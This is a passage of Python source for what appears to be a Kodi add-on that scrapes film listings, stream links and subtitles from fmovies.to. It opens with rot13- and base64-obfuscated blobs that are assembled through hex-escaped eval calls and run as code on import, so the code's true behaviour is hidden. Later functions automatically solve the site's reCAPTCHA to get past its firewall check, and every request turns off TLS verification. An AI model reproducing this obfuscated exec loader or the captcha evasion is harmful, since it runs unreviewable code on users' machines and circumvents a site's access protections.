QL1ZmD0AQH2Zmx1ZwD2AmR0MQD3AmpmZmpmAmNmZGHjAwR3ZQplAGZ3AQLlAwL2MGLkZmL2MGH3AQV2AQZmA2R1AwHkAwLlLwLkAmxmZmH3AJR2AwMxAGt0AwEzATR2MQHjAGH3ZmZ2AQx3ZQZ1AQt3ZQZ1ZmZ1ZQL1AmN2MGplATD0MGquAmt2AwMzAGVmBGH0AQDmAQHkAQDmAGMuAmL1ZGMyAwR1AGD5AwL2MGZ1ATHmBQD4AmV3BQZkAmV1ZwHlAwDmZQMzAGx2ZwZjAGLmAwquZmp0LmpkAmxmAmp3AGR2AQMzAwV0AGp4AwD2AwWzAzLmAQZlZmV2ZmZ5ZzL0MQp4AwR3AwL3AGZmBGH4ATD2AGZ2Az'
oracle = 'I2ZTRhNDU2ZTU5NjYzMjM0Njc1YTcyNzY1MjdhNWE1ODUxNjg0MzUzNmE0ZDRlNzU1MjQ2NGI1MjZkNzUyZjMxNzA0MzY2NWEzMjY5NDk3ODcwMzI2NzRjNDEzMjM5MzYzOTU5NGE3MjU4NTI0Yjc5NDk1MDUxNDk3NDcwMzY3NDRhNDk2MTM2NmU0YzU2NDI0NzQ2Nzg2ZTRiNDI2MjY0Mzc1YTY3MmY0NzM0Mzc1MTYzNDU3NTU3MzA1NjY1NDM2NTU2NzAzNjRlNDM2MTU3NmM0ZTQzNGU2ZjU0NTM0ZTQxNTQ1ODQ1MzE1YTY0NjE2MTY4Njc3OTMxNWEyZjZkNDY3MDMwNmE2YTY4NGY2ODQ3NGM1MjU5NzE0NzU2NTM3MjM5NjE0YzVhNjU1MTQzNzMzODZjNWE0ZDQ4NTc2ZDc5MzA2OTQ5NWE0NjczNjc2ZDcyNTM2MjQ1NDI3MjZhNTA3NjU5NTk1ODc1NmUzOTQ1NmE0NDU5MzE3NjZlNDU1MDcwNTE0NzZiNGM1MTRjNTIyZjY4NTg2ZjM0NjM0OTQ5NjU1OTJiNzg0ZTMyNTE0ZjczNDg0ZjZjNGQzOTRkNzU2YjMxNTQ0OTcwMzI2NTYxNTg2ODRhNzczMDM1NjE1NTY5NGE3MjYyNjI1MzZmNzc3NDQzNDE2ZjUxNGU3NzU4NjY0YTMxNmM3NTMzMzY3NDY4NDg3MzczNTUzMDU2NzI3MDZjNWE0Yzc0NDk2OTQ1NGU3MDYxNDY1NjQ0NGQzNTUzNjg2ODcyNjE0YjQzNTE3MDRiMzQ3NzZjNTMzMDUyNDEzMjM0NTM0NjQzNGQ1OTU0NmQ1MTRhNGU3NTcxNTE2ZTc4NTQ0NjQxNjQ3NjM1MzA2NzU5NGM1NDQ1NGM2OTQ2NjM2YTY3Nzk3NzZlNzA0MzY2NTMyZjMxNDI2ZTZhMzQ2ODQ3NGU0YTY2NTQ1MDc5NmM2ODRhNjg0Mjc0MzIzNzc0MzI2MjRhNTg2MjQ1NGQ0ODUxNmQ0ZTcyNTE2ZDM0NmM1Mjc4NGU3MzU5NTM3NTMwMmI3NjcxNjU0YzU0Njk2ODQyNDU3NDQ0MzY3MDcwNjY0NDUzNmI1NDU3NmE2MzMwNDQ0NTM0NDk1Nzc2NGU0NDRmNTU3NDQzNzUzNDU0NjkzMjQ0NGE2NjUzNDE2NjMyMzQ2MzZhNDQzMDZjNDI2YzQ3Njg0ZjM2NDg3YTU2NDU1MjQzNjk3MTZjNzA0MTYyMzU0NTYzMzk2Mzc3NTM1Mzc4NzE0ZjQ3NDU1MDUyNTk2OTY2N2E0YTcxNTE1NzY2MzY0YjY2MmI2MjRiNTc2ODQxNDU0YTU0NDc3NjRiNjE1NzZlNzI3MzZmMzIzMDc0MzM1NjZmNTQ1YTRkNzY1MjQyNzY1MTMwMzI2MjUwNGUzMTZhMzc1NDM4NDc0ZTQ3NzU1OTdhNjE2NjcxNmQ1ODMwNTM1MDMwNTA1OTMzNTE2MTQyNjQ1OTZmN2E2OTQzNGI0MTc2NTM0ZDU1NzgzODYzNGE1MjQyNjE0YTc3NTE0YzY2NTc2YTM5N2E0NzMxNjY2NjZkNTM0NTRlNTk1ODZjNGIzOTQ4NTE2ZjUyNTM0ZTU3NTEyZjZhNjM2NzQ1NzgzMDMzMzg2MjZmNGM1NTU4NDQzMDM2NjM3MjUzMzk0NTM5NGI0NzUwMzI1NzQ1NTI0ZTZlMzYzNjMzNzQ0NjYxNGM2OTZiNjYyYjQzNjM2NjY4NmY3ODYyNjQzNDQ5NDY2NTUzNDU1YTRkNjc1ODM3NjI2MTZkNDg1NzY2MzI0MjQyMmY3MDU1NjQ3NzU4NzQ1MDQ5MzE0YjZlNDk3MjZhNmY0YzcxNjE1MjMzNzQ1MjU1MzY2YTY3NmM0YTQ0Njc0OTU0MzQ2MjQxMzE3MDU1MzUyZjcwMzE3NDQ2MmI1MDQyNDk2OTcwNjYzNDM0NzU3MTZmNmY1MjMwNGM3MDQ1MmY1MTMwNjM2ODU0NDU2YjUxNzg0ODRlNDI3ODc4Nzg0YzUyNDg2NzJmNzI0ZTM5NDM2OTRjNTYzOTcxMzc0ODZjNzMzNTRiN2EzMjc5NDEyZjMyMmI0ZTMwNDc2NjYxNTE1NTM3MzE0MzRkMmY2NjQ1NjQ0OTU2NjM0YTMyNjQ0ZTc5NjgzMzQ1Nzk0ZjQxNDU2OTZlNDk2YTc4NDY0YjQ5Mzg1MTUwMzgyYjczNDM1MTU4Nzk3NTUyMzU2ODM5NTk1MzUxMzE2YzZmNjUzMjY1NTM1MDZhNDM2NTMwNDczODRhNzczMjcwNjY3MDUyMzk3MTc2NDM0MjZlNGY0YTZiNjk0YzMwNDg0MjRkNjY2NjUyNjY0OTMwNDg3MzZhNjI2ODUxNDU3NDZmNTU3MzQxNjQ0MzY2NGU1MTZlMzc2MzYxNjI3ODY3NmYzNzdhMzk0MjM2MzE3NDQxNzM1MjdhNjc2NTZmNTYzMzQ3NDQ1NjRlNDQ1NzcyNTcyYjZhNmY1NDJiNzc0YTYzMzE1MTU0NmUzMDczMzQ2ZjZhNGQ0MTMzNmE1NDQ4MzU0ODY1NjU3MTUyNGE0NzRkNTUzNDJiNGIzNDMxNmM0MzU5MzU2YzRmNTA1NzU0NGI0ZjQ0NDY1MDcxNjQ2NTc2NTE2YTdhNGQ3NDRhMzk3MTM2MzE2ZjY1Njg1MjM0NTYzNjcyNGI0ODZhNjc3MTU1NjgyYjVhNGE3ODRkNjEyYjZmNTgzMDU4MmYzNDU2Njg0Mzc4N2E0Zjc1MzA3OTRkMzczNzQ1MzMzOTUzNmI0YzMzNzM3NzZjNjk3MDMxMzQ0YTM5NjU3Mjc2NGY0NDQ5MzU2NzMzMzc3MTQ4MmY3NDU4NDg0YTQ1Nzk3YTc0NzQ2MTYyMzQ1NDM2NGY0MzcyNDI0Zjc2Njg2NTUwMzk2YjU4MzQ1NjUxMzkzNjc0NGM3ODZiNTg0NzQ4Mzk3MDRhNzA0NzRhNGU2YTU2NjM1ODU5NGQzODU4NDI1NjQyNDQ2OTMxNmE2MTc0MzQ1NTQ4NmY2MTMwMzA2ZjU2NTkyZjU3NDM0NDZiNjk0Njc1NmYzNDUzMzI2ODRmNTEzNzcxNmQ2ODY4NzA3MDM5MzM2ZjMwNzg1ODY4NGM3MTRhNGY2YTYxNzQ3MTQ3NDg2YzZiMzY0NTMzMmY1MDZhNGQ3NjZkNjU2ZjRjNTk2MzRiNTk2NTQ4NTI0ZTY5MzE1MzRkMmYzNzU3NjMzNjY0NzU2ODM4NGQ0ZTRhMmY0NTQ3MmI3NzZlMzQzNzZhNmIzNTc3MzA3YTVhNTQ2MjY0Njg2ZjZjNzc0ODJmNTg2ODRmNTkzNTMwNzQ1YTc4NDI1MDM1NGYzNjRjNzE1NTQ2NmI2NjY2NmE0ZDJiNDk0MzJmNDE0NDJiNmE3NDc5NDk3MTQ2MmY2YTZmNzI0OTZkMzQ2MjU5NGU1ODUzNmUyZjU1NDg0NDc0NzQ1MTY2MzMyZjc2NjU0MjUwNjY1NzQ4NDE3NDc0NDM2MTU2NGY0OTM1NDkzMDZkMmI1MjQ0NTc0MjY4MmI3NzQ4NzczMjZhNTQ0OTQ5NjM1NDRjMzI2MzUyNTMyZjM1NTE2NzQ4NjQ0YTQxMmY0ZTU1MzU3ODUxNzg2YzM2NDY0YjRjNjY2YjMxMzc0NzYyMzk2ODUwNzI2NTU1Nzg1NDRiNTAzMTY3NzQ0MTMyNTIyYjRjNDc0Njc3NTI3MTQ5NGEzOTRmNjQ0NDQxNjY0ZDYzMzY1MTYyMmY3MTRhNDg2OTU4NDI3NjJiNjk3NjRhNjU2ZTY3Njk0OTY1NTE3MjM3NTIzMDY2NDUzNjVhMzkzMzU3NjM1OTM2Nzg0ODZlNDY2NDY2NmY3OTM3NjE1MjU1N2EzNDZjNmUzNzQ4NGQ1MTM2Njg2MTZiNjQyZjU0Mzk2ZTM2NDg2OTQ2NTM1NTJiNzQ2MTM1N2E1ODM2NTA2NTc4NGE3ODMyNDM0ZjZjNzM1NDU4MzY0NjU0NGMzOTMyNzUzMDdhNzA0NTU5Mzc1OTM1NTE1MDMwNjY0ZjY4NjE1YTMzNDc2YTMwNGM2Yjc5NGQ3ODMyNzA0OTY1NzQ1NzZmNmY3NjRlNDQ3ODU3NTU1MDZkNGM2ZTJiNzk2ZjUwMzA0OTJiNzE0MzY0NjE0Yzc1NDU3NjZkNmU2ZTMyNmMyYjZmNWEzMDRjNGIzNDRhNjY1MTc1NjY3MTRiNzEzOTUxNmU1OTM0NzczMzUxNjM2OTZhN2E2Yzc2NTY0MjRmNGU2ZTJmNDU2YjQ1N2E3NDRmNmE0YzRkNzE0YzQ5Nzc1NjQ0NmE3OTUxNTE2ZDMzNTEzODZmNTYzMjc5NDQ2ODY5NzI2MTU1NTQ0MjZiNjY2OTZmNDk1ODU0MzYzMTY1Nzk2ZTU4NzY2ODU0NDE0YTMyNTA3NDZjNTA2MzM1NDM2OTUwN2E3OTZjNTAzNTY3NzU0ZjMyNmI3NjcxNmUzNzYxNmE1MjM4NDQ2Nzc0Mzc0MzMxNGM0MjZkNjYzNjY5MmIzNzUxNDYzMjU0NjEyYjY4NjE2YTMwNzk2ZTUwNGQ0YjM4NTA0ZDcxNzYzMDUxMzE3YTU2MzYzNTQ4NGQ0NDZlNzA3MTdhMzE2MjZhNzc0YzMwMzY0NjY0NDQzNDRlNTQ2YTcxNGYzMzU0NzA1NzM5MzY3YTQ4NjUzMDUwMmY2OTMxNzI3NTc2MzA2NTQyNzg3OTcwNjQzMTc4Mzk0NDU3NGU3MTc0NGI3NjQ1NTkzOTUwNjUzNDQ5NjQ3MzZhMzU2YTY2NjE0NDdhNDIzMjczNzYzMTZmNTgzMDQyNzgzMDUwNjgzMjZiNTU1NDU0Mzg2YzRjMzY3ODUwNTQ3NDVhNmI1MDM1NTE1MjM0Njg3ODQ4NmU1OTc3NzI0ODQ0NTg1MTcyNmQ3NjM5NDU3NzZmMzk1NzZjNGU2NjUwMzI0ODY4MzY0YTc2Nzk1NzYyNzM2MzYxNTg3NDM2NzQ0YjUzMmI1MjcxNzk3MzcxMmY1MzM0NTM2MzYzNmM0ZTU5MzI1MTQ3NTg2MzM1Njk3NDRlNzg1NDYzNjQ2NDUzMzg3NDMxNmU0ZjZmNzE3MDU1NjY0NTMyMmI2ZDZlNGE1NjRlMzk1MzU2NzMzMzcwNzQ0NzRkMzk3YTU3MzY1YTU2N2E1ODY2NGM0YTc1NTkzMzdhNjkzMTY0NGE2YTUyNWEzMDMzMzY0MTM5MzYzOTQ3NjQ1MDYzNmQ1MzY0NmY0Zjc2NTgzMzMwNjY1NjMyNDkzODZhNzIzNjJmNTI1MjYzNmIzODU2NjI0Mzc1NGE0ODMzNGY0YTQ3NjY1NzQyMzY3OTMzNTc1MTJmNmY1NTY1NmM0MTJiNTU3YTc4NmM1MzRmNzk2NzY5NTAyYjUxNjYzODU1NTk0YjY2MzE3NzM5NDU3NzM3NmU2YjRmMzk1NTc3MmYyYjUwNzA3MDY3NzEyZjQ4NTIzNTUxMzczNDJiNDM2MjJmNmI2YjQ4NTIzNzJiMzEyZjcwNmI1MTM2MzE1ODUxNzM2NDQ2MzA2MTU0NmM3ODY4NDY1NjUzNzY2YzRjMmY2ODQ1NjU1MDYyNDU2N'
keymaker = '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'
zion = '\x72\x6f\x74\x31\x33'
neo = eval('\x6d\x6f\x72\x70\x68\x65\x75\x73\x20') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x74\x72\x69\x6e\x69\x74\x79\x2c\x20\x7a\x69\x6f\x6e\x29') + eval('\x6f\x72\x61\x63\x6c\x65') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6b\x65\x79\x6d\x61\x6b\x65\x72\x20\x2c\x20\x7a\x69\x6f\x6e\x29')
eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec')) 
   
def getVerid(id):

    ab='aaaaaa'#AAAAAAAAAA'#ABBDEEBBAABBAABB'#ggo()
    ac = id

    hj = dekodujNowe (ab,ac)

    if sys.version_info >= (3,0,0):
        hj=hj.encode('Latin_1')

    hj2 = encode2(hj)   
    if sys.version_info >= (3,0,0):
        hj2=(hj2.decode('utf-8'))
        

    hjkl = ab + hj2
    return hjkl
    
def getLinks(exlink):
    href,id = exlink.split('|')

    html = sess.get(href, headers=headers, verify=False).content
    if sys.version_info >= (3,0,0):
        html = html.decode(encoding='utf-8', errors='strict')
    result = parseDOM(html, 'section', attrs={'class': "info"})[0]  
    plot = parseDOM(result, 'div', attrs={'itemprop': "description"})
    plot = PLchar(plot[0]) if plot else ''
    imag = parseDOM(result, 'img', ret='src')#[0]
    imag = imag[0] if imag else ''
    imag = 'https:'+imag if imag.startswith('//') else imag
    
    genres = re.findall('Genre\:(.+?)<\/div>',result)
    genres = genres[0] if genres else ''

    gg = re.findall('>([^<]+)<\/a>',genres)
    genre = ', '.join([(x.strip()).lower() for x in gg]) if gg else ''

    countries = re.findall('Country\:(.+?)<\/div>',result) # 
    countries = countries[0] if countries else ''
    cc = re.findall('>([^<]+)<\/a>',countries)
    country = ', '.join([x.strip() for x in cc]) if gg else ''

    tim = re.findall('span>(\d+)\s*min<',result)
    tim = int(tim[0])*60 if tim else ''

    
    
    qual = parseDOM(result, 'span', attrs={'class': "quality"}) 
    qual = qual[0].strip() if qual else ''

    yr = parseDOM(result, 'span', attrs={'itemprop': "dateCreated"})  
    yr = yr[0].strip().split('-')[0] if yr else ''
    infol = {'plot':PLchar(plot),'genre': genre,'country':country,'duration':tim,'year':yr}

    headers.update({'Referer': href})
    
    

    verid = getVerid(id)
    recap="03AGdBq25eDJkrezDo2y"
    params = (
        ('id', id),
       # ('verified', verid),
        ('vrf', verid),
        ('token', recap),
    )

    response = sess.get('https://fmovies.to/ajax/film/servers', headers=headers, params=params, verify=False)#
    
    html= (response.content)
    if sys.version_info >= (3,0,0):
        html = html.decode(encoding='utf-8', errors='strict')
    html= html.replace('\\"','"')

    if 'sitekey=' in html:

        sitek=re.findall('data\-sitekey="(.+?)"',html)[0]

        token = recaptcha_v2.UnCaptchaReCaptcha().processCaptcha(sitek, lang='en')

        data = {
                'g-recaptcha-response': token}
        
        response = sess.post('https://fmovies.to/waf-verify', headers=headers, data=data, cookies=sess.cookies, verify=False)#
        
        params = (
            ('id', id),
            ('token', token),
        )
        response = sess.get('https://fmovies.to/ajax/film/servers', headers=headers, params=params, cookies=response.cookies, verify=False)#

    html = (response.content)#.replace('\\"','"')
    if sys.version_info >= (3,0,0):
        html = html.decode(encoding='utf-8', errors='strict')
    html= html.replace('\\"','"')


    linki = re.findall('data-id="([^"]+).*?<div>([^<]+)',html)
    for linkid1,host in linki:
        tyt = nazwa+' - [I][COLOR khaki]'+host+'[/I] '+' [B][/COLOR][/B]'

        linkid = re.findall(linkid1+'"\:"([^"]+)',html)#[0]
        if linkid:
            add_item(name=PLchar(tyt), url=linkid[0]+'|'+href, mode='playlink', image=imag, folder=False, infoLabels=infol, IsPlayable=True)
    
    


    if len(linki)>0:

        xbmcplugin.setContent(addon_handle, 'videos')
        xbmcplugin.endOfDirectory(addon_handle)    
    else:
        xbmcgui.Dialog().notification('[B]Error[/B]', 'No content to display',xbmcgui.NOTIFICATION_INFO, 8000,False)
        
def dec(chra):

    try:    
        if sys.version_info >= (3,0,0):
            chra =repr(chra.encode('utf-8'))
            chra = chra.replace('\\xc3\\xaa','ę').replace('\\xc3\\x8a','Ę')
            chra = chra.replace('\\xc3\\xa6','ć').replace('\\xc3\\x86','Ć')
            chra = chra.replace('\\xc2\\xbf','ż').replace('\\xc2\\x9f','Ż')
            chra = chra.replace('\\xc2\\xb9','ą').replace('\\xc2\\x99','Ą')
            
            chra = chra.replace('\\xc5\\x93','ś').replace('\\xc5\\x92','Ś')
            chra = chra.replace('\\xc3\\xb3','ó').replace('\\xc3\\x93','Ó')
            
            chra = chra.replace('\\xc5\\xb8','ź').replace('\\xc5\\xb7','Ź')
            
            chra = chra.replace('\\xc2\\xb3','ł').replace('\\xc2\\x93','Ł')
            
            chra = chra.replace('\\xc3\\xb1','ń').replace('\\xc3\\x91','Ń')
            chra = chra .replace("b\'",'')

            chra = chra .replace("\\n",'\n').replace("\\r",'\r') 
            chra = chra .replace("\\'","'")

        else:

            chra = chra.replace('\xc3\xaa','ę').replace('\xc3\x8a','Ę')
            chra = chra.replace('\xc3\xa6','ć').replace('\xc3\x86','Ć')
            chra = chra.replace('\xc2\xbf','ż').replace('\xc2\x9f','Ż')
            chra = chra.replace('\xc2\xb9','ą').replace('\xc2\x99','Ą')
            
            chra = chra.replace('\xc5\x93','ś').replace('\xc5\x92','Ś')
            chra = chra.replace('\xc3\xb3','ó').replace('\xc3\x93','Ó')
            
            chra = chra.replace('\xc5\xb8','ź').replace('\xc5\xb7','Ź')
            
            chra = chra.replace('\xc2\xb3','ł').replace('\xc2\x93','Ł')
            
            chra = chra.replace('\xc3\xb1','ń').replace('\xc3\x91','Ń')



    except:
        pass
        
    return chra
    
def transPolish(subtlink):

    try:
        response = sess.get(subtlink, headers=headers, verify=False)#.content

        if sys.version_info >= (3,0,0):
        
            response  = response.text
        else:
            response  = response.content
        gg=dec(response)

        open(napisy, 'w').write(gg)

        return True
    except:
        return False
    
def PlayLink(exlink):
    id,href = exlink.split('|')

    params = (
        ('id', id),
    )

    headers.update({'Referer': href})
    response = sess.get('https://fmovies.to/ajax/episode/info', headers=headers, params=params, verify=False)#

    ab=response.content
    if sys.version_info >= (3,0,0):
        ab = ab.decode(encoding='utf-8', errors='strict')
    
    
    try:
        jsonab = json.loads(ab)
    except:
        pass
    if jsonab:
        url = jsonab.get('url',None)

    link2 = DecodeLink(url)

    reg = '?sub.info='
    reg = reg if reg in link2 else '?subtitle_json='

    link,subt = link2.split(reg)
    
    
    subsout=[]
    subtx = unquote(subt)
    subt = False
    if subtx:
